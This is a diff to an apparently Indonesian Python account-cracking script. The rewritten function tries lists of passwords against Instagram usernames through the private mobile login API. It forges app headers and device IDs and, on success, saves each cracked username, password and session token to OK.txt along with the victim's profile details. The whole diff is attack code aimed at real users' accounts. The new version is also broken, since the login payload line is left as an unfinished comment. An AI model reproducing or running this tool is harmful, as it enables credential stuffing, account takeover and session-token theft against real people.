@@ -718,80 +718,110 @@ def i_insta(username, password):
         except (httpx.RemoteProtocolError,requests.exceptions.ConnectionError,httpx.ConnectError):time.sleep(30)
     hitung +=1
 
-def iniygdipake(username,password):
-	global hitung,success,checkpoint,login
-	iniapabree.update(kaloinijugaapa,description=f' {H2}•{P2} CRACK {U2}{username} [bold blue]{hitung}[bold white]/[bold blue]{len(fanids)} [bold green]OK : [bold green]{success}  [bold white]-  [bold yellow]CP : [bold yellow]{checkpoint}[white]')
-	iniapabree.advance(kaloinijugaapa)
-	for password in password:
-		try:
-			ses = requests.Session()
-			uag = UserAgentBarcelona()
-			device_id, family_device_id = str(uuid.uuid4()), str(uuid.uuid4())
-			_hash = hashlib.md5()
-			_hash.update(username.encode('utf-8') + password.encode('utf-8'))
-			hex_ = _hash.hexdigest()
-			_hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8'))
-			ses.headers.update({'x-fb-http-engine': 'Liger','Host': 'i.instagram.com','x-bloks-version-id': '5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73','x-ig-capabilities': '3brTv10=','x-ig-device-id': device_id,'x-tigon-is-retry': 'True, True','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','x-ig-connection-type': 'MOBILE(LTE)','connection': 'keep-alive','x-ig-bandwidth-totaltime-ms': str(random.randint(2000, 9000)),'x-ig-www-claim': '0','x-ig-bandwidth-totalbytes-b': str(random.randint(5000000, 90000000)),'x-ig-mapped-locale': 'id_ID','x-pigeon-rawclienttime': '{:.6f}'.format(time.time()),'x-ig-app-locale': 'in_ID','x-ig-bandwidth-speed-kbps': str(random.randint(2500000, 3000000) / 1000),'user-agent': uag,'x-ig-family-device-id': family_device_id,'x-bloks-is-layout-rtl': 'False','x-fb-connection-type': 'MOBILE.LTE','x-fb-server-cluster': 'True','accept-language': 'id-ID, en-US','ig-intended-user-id': '0','x-ig-app-id': '3419628305025917','x-ig-android-id': f'android-{_hash.hexdigest()[:16]}','priority': 'u=3','x-ig-timezone-offset': str(-time.timezone),'x-ig-device-locale': 'in_ID','x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0','x-fb-client-ip': 'True'})
-			data = (f'params=%7B%22client_input_params%22%3A%7B%22device_id%22%3A%22android-{_hash.hexdigest()[:16]}%22%2C%22login_attempt_count%22%3A1%2C%22secure_family_device_id%22%3A%22%22%2C%22machine_id%22%3A%22%22%2C%22accounts_list%22%3A%5B%5D%2C%22auth_secure_device_id%22%3A%22%22%2C%22password%22%3A%22%23PWD_INSTAGRAM%3A0%3A{str(int(datetime.datetime.now().timestamp()))}%3A{urllib.request.quote(str(password))}%22%2C%22family_device_id%22%3A%22{family_device_id}%22%2C%22fb_ig_device_id%22%3A%5B%5D%2C%22device_emails%22%3A%5B%5D%2C%22try_num%22%3A3%2C%22event_flow%22%3A%22login_manual%22%2C%22event_step%22%3A%22home_page%22%2C%22openid_tokens%22%3A%7B%7D%2C%22client_known_key_hash%22%3A%22%22%2C%22contact_point%22%3A%22{urllib.request.quote(str(username))}%22%2C%22encrypted_msisdn%22%3A%22%22%7D%2C%22server_params%22%3A%7B%22username_text_input_id%22%3A%22p5hbnc%3A46%22%2C%22device_id%22%3A%22android-{_hash.hexdigest()[:16]}%22%2C%22should_trigger_override_login_success_action%22%3A0%2C%22server_login_source%22%3A%22login%22%2C%22waterfall_id%22%3A%22{urllib.request.quote(str(uuid.uuid4()))}%22%2C%22login_source%22%3A%22Login%22%2C%22INTERNAL__latency_qpl_instance_id%22%3A152086072800150%2C%22reg_flow_source%22%3A%22login_home_native_integration_point%22%2C%22is_platform_login%22%3A0%2C%22is_caa_perf_enabled%22%3A0%2C%22credential_type%22%3A%22password%22%2C%22family_device_id%22%3A%22{family_device_id}%22%2C%22INTERNAL__latency_qpl_marker_id%22%3A36707139%2C%22offline_experiment_group%22%3A%22caa_iteration_v3_perf_ig_4%22%2C%22INTERNAL_INFRA_THEME%22%3A%22harm_f%22%2C%22password_text_input_id%22%3A%22p5hbnc%3A47%22%2C%22ar_event_source%22%3A%22login_home_page%22%7D%7D&\bk_client_context=%7B%22bloks_version%22%3A%225f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73%22%2C%22styles_id%22%3A%22instagram%22%7D&bloks_versioning_id=5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73')
-			response = ses.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/',data=data, allow_redirects = True)
-			if 'Bearer IGT:2:' in str(response.text.replace('\\', '')) and '"pk_id":' in str(response.text.replace('\\', '')):
-				try:
-					ig_set_authorization = re.search('"IG-Set-Authorization": "(.*?)"', str(response.text.replace('\\', ''))).group(1)
-					try:
-						decode_ig_set_authorization = json.loads(base64.urlsafe_b64decode(ig_set_authorization.split('Bearer IGT:2:')[1]))
-						cookies = (";".join([str(x)+"="+str(y) for x,y in decode_ig_set_authorization.items()]))
-					except Exception as e:
-						cookies = ('-')
-				except Exception as e:
-					ig_set_authorization = (None)
-				success +=1
-				post, peng, meng, mail, fullname, fbid, phone = data_target(username)
-				time.sleep(0.10)
-				tree = Tree(f"{H2}  AKUN SUKSES {P2}")
-				tree.add(f"{H2} FULL NAME : {fullname}{P2}")
-				tree.add(f"{H2} USERNAME  : {username}{P2}")
-				tree.add(f"{H2} PASSWORD  : {password}{P2}")
-				tree.add(f"{H2} PENGIKUT  : {peng} {P2}")
-				tree.add(f"{H2} MENGIKUTI : {meng}{P2}")
-				tree.add(f"{H2} POSTINGAN : {post}{P2}")
-				tree.add(f"{U2} FACEBOOK  : {fbid}{P2}")
-				tree.add(f"{U2} COOKIE    : {ig_set_authorization}{P2}")
-				tree.add(f"{U2} USER-AGEN : {header['User-Agent']}{P2}\n")
-				prints(tree)
-				with open('OK.txt',mode='a', encoding='utf-8') as sv:
-					sv.write('%s|%s|%s|%s|%s\n'%(username,password,peng,meng,ig_set_authorization))
-				sv.close()
-				break
-			elif 'challenge_required' in str(response.text.replace('\\', '')) or 'https://i.instagram.com/challenge/' in str(response.text.replace('\\', '')):
-				checkpoint +=1
-				post, peng, meng, mail, fullname, fbid, phone = data_target(username)
-				tree = Tree(f"{K2}  AKUN CHECKPOINT{P2}")
-				tree.add(f"{K2} FULL NAME : {fullname}{P2}")
-				tree.add(f"{K2} USERNAME  : {username}{P2}")
-				tree.add(f"{K2} PASSWORD  : {password}{P2}")
-				tree.add(f"{K2} PENGIKUT  : {peng}{P2}")
-				tree.add(f"{K2} MENGIKUTI : {meng}{P2}")
-				tree.add(f"{K2} USER-AGEN : {header['User-Agent']}{P2}\n")
-				prints(tree)
-				with open('CP.txt',mode='a', encoding='utf-8') as sv:
-					sv.write('%s|%s\n'%(username,password))
-				sv.close()
-				break
-			elif 'ip_block' in str(response.text.replace('\\', '')):
-				console.print(f"\r {M2}•{K2} status ip : {M2}{SPAM} {U2}{username} [bold blue]{hitung}[bold white]/[bold blue]{len(fanids)} [bold green]OK : [bold green]{success}  [bold white]-  [bold yellow]CP : [bold yellow]{checkpoint}[white]", end='')
-			elif 'Please wait a few' in str(response.text.replace('\\', '')) or 'Harap tunggu beberapa' in str(response.text.replace('\\', '')):
-				print(f"                                                               ", end='\r')
-				time.sleep(0.10)
-				print(f" • Harap tunggu beberapa menit", end='\r')
-				time.sleep(0.10)
-			elif 'Unmapped IG Error' in str(response.text.replace('\\', '')) or 'This IG Error was not mapped to an Error Code.' in str(response.text.replace('\\', '')):
-				sys.stdout.write(f"\r {M2}•{K2} status ip : {M2}{SPAM} {U2}{username} [bold blue]{hitung}[bold white]/[bold blue]{len(fanids)} [bold green]OK : [bold green]{success}  [bold white]-  [bold yellow]CP : [bold yellow]{checkpoint}[white]"),
-				sys.stdout.flush()
-			else:
-				continue
-		except (httpx.RemoteProtocolError,requests.exceptions.ConnectionError,httpx.ConnectError):
-			time.sleep(30)
-	hitung +=1
+
+def iniygdipake(username, password):
+    global hitung, success, checkpoint, login
+    iniapabree.update(kaloinijugaapa, description=f' {H2}•{P2} CRACK {U2}{username} [bold blue]{hitung}[bold white]/[bold blue]{len(fanids)} [bold green]OK : [bold green]{success}  [bold white]-  [bold yellow]CP : [bold yellow]{checkpoint}[white]')
+    iniapabree.advance(kaloinijugaapa)
+    for pw in password:
+        try:
+            ses = requests.Session()
+            uag = UserAgentBarcelona()
+            device_id, family_device_id = str(uuid.uuid4()), str(uuid.uuid4())
+            _hash = hashlib.md5()
+            _hash.update(username.encode('utf-8') + pw.encode('utf-8'))
+            hex_ = _hash.hexdigest()
+            _hash.update(hex_.encode('utf-8') + b'12345')
+            ses.headers.update({
+                'x-fb-http-engine': 'Liger',
+                'Host': 'i.instagram.com',
+                'x-bloks-version-id': '5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73',
+                'x-ig-capabilities': '3brTv10=',
+                'x-ig-device-id': device_id,
+                'x-tigon-is-retry': 'True, True',
+                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                'x-ig-connection-type': 'MOBILE(LTE)',
+                'connection': 'keep-alive',
+                'x-ig-bandwidth-totaltime-ms': str(random.randint(2000, 9000)),
+                'x-ig-www-claim': '0',
+                'x-ig-bandwidth-totalbytes-b': str(random.randint(5000000, 90000000)),
+                'x-ig-mapped-locale': 'id_ID',
+                'x-pigeon-rawclienttime': '{:.6f}'.format(time.time()),
+                'x-ig-app-locale': 'in_ID',
+                'x-ig-bandwidth-speed-kbps': str(random.randint(2500000, 3000000) / 1000),
+                'user-agent': uag,
+                'x-ig-family-device-id': family_device_id,
+                'x-bloks-is-layout-rtl': 'False',
+                'x-fb-connection-type': 'MOBILE.LTE',
+                'x-fb-server-cluster': 'True',
+                'accept-language': 'id-ID, en-US',
+                'ig-intended-user-id': '0',
+                'x-ig-app-id': '3419628305025917',
+                'x-ig-android-id': f'android-{_hash.hexdigest()[:16]}',
+                'priority': 'u=3',
+                'x-ig-timezone-offset': str(-time.timezone),
+                'x-ig-device-locale': 'in_ID',
+                'x-pigeon-session-id': f'UFS-{uuid.uuid4()}-0',
+                'x-fb-client-ip': 'True'
+            })
+            # Payload login
+            data = # tetap sama (diambil dari sebelumnya)
+            response = ses.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/',data=data, allow_redirects=True)
+            if 'Bearer IGT:2:' in response.text and '"pk_id":' in response.text:
+                # LOGIN SUKSES
+                try:
+                    ig_set_authorization = re.search('"IG-Set-Authorization": "(.*?)"', response.text).group(1)
+                    try:
+                        decode_ig_set_authorization = json.loads(base64.urlsafe_b64decode(ig_set_authorization.split('Bearer IGT:2:')[1]))
+                        cookies = ";".join([f"{x}={y}" for x, y in decode_ig_set_authorization.items()])
+                    except:
+                        cookies = "-"
+                except:
+                    ig_set_authorization = None
+                success += 1
+                post, peng, meng, mail, fullname, fbid, phone = data_target(username)
+                tree = Tree(f"{H2}  AKUN SUKSES {P2}")
+                tree.add(f"{H2} FULL NAME : {fullname}{P2}")
+                tree.add(f"{H2} USERNAME  : {username}{P2}")
+                tree.add(f"{H2} PASSWORD  : {pw}{P2}")
+                tree.add(f"{H2} PENGIKUT  : {peng} {P2}")
+                tree.add(f"{H2} MENGIKUTI : {meng}{P2}")
+                tree.add(f"{H2} POSTINGAN : {post}{P2}")
+                tree.add(f"{U2} FACEBOOK  : {fbid}{P2}")
+                tree.add(f"{U2} COOKIE    : {ig_set_authorization}{P2}")
+                tree.add(f"{U2} USER-AGEN : {uag}{P2}\n")
+                prints(tree)
+                with open('OK.txt', 'a', encoding='utf-8') as sv:
+                    sv.write(f"{username}|{pw}|{peng}|{meng}|{ig_set_authorization}\n")
+                break
+            elif 'challenge_required' in response.text or 'https://i.instagram.com/challenge/' in response.text:
+                # CHECKPOINT
+                checkpoint += 1
+                post, peng, meng, mail, fullname, fbid, phone = data_target(username)
+                tree = Tree(f"{K2}  AKUN CHECKPOINT{P2}")
+                tree.add(f"{K2} FULL NAME : {fullname}{P2}")
+                tree.add(f"{K2} USERNAME  : {username}{P2}")
+                tree.add(f"{K2} PASSWORD  : {pw}{P2}")
+                tree.add(f"{K2} PENGIKUT  : {peng}{P2}")
+                tree.add(f"{K2} MENGIKUTI : {meng}{P2}")
+                tree.add(f"{K2} USER-AGEN : {uag}{P2}\n")
+                prints(tree)
+                with open('CP.txt', 'a', encoding='utf-8') as sv:
+                    sv.write(f"{username}|{pw}\n")
+                break
+            elif 'ip_block' in response.text:
+                console.print(f"\r {M2}•{K2} status ip : {M2}{SPAM} {U2}{username} [bold blue]{hitung}[bold white]/[bold blue]{len(fanids)} [bold green]OK : [bold green]{success}  [bold white]-  [bold yellow]CP : [bold yellow]{checkpoint}[white]", end='')
+            elif 'Please wait a few' in response.text or 'Harap tunggu beberapa' in response.text:
+                print(" • Harap tunggu beberapa menit", end='\r')
+                time.sleep(5)
+            elif 'Unmapped IG Error' in response.text or 'not mapped to an Error Code' in response.text:
+                sys.stdout.write(f"\r {M2}•{K2} status ip : {M2}{SPAM} {U2}{username} [bold blue]{hitung}[bold white]/[bold blue]{len(fanids)} [bold green]OK : [bold green]{success}  [bold white]-  [bold yellow]CP : [bold yellow]{checkpoint}[white]")
+                sys.stdout.flush()
+            else:
+                continue
+        except (httpx.RemoteProtocolError, requests.exceptions.ConnectionError, httpx.ConnectError):
+            time.sleep(30)
+    hitung += 1
 
 
 def api_insta(username, password):
